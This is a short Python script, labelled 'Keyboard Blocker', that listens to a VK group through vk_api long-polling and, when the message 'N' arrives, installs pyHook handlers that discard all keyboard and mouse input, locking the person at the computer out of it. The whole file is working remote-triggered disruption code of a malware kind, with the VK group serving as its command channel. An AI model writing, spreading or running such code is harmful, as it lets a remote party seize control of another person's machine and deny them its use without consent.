import vk_api
import pythoncom, pyHook
from vk_api.longpoll import VkLongPoll, VkEventType

#Keyboard Blocker

def uMad(event):
    return False


token = "text-token"  #token from the VK group
vk_session = vk_api.VkApi(token = token)

session_api = vk_session.get_api()
longpoll = VkLongPoll(vk_session)


while True:
    for event in longpoll.listen():
        if event.type == VkEventType.MESSAGE_NEW:
            if str(event.text) == "N":   #when message N comes

                hm = pyHook.HookManager()
                hm.MouseAll = uMad
                hm.KeyAll = uMad
                hm.HookKeyboard()
                pythoncom.PumpMessages()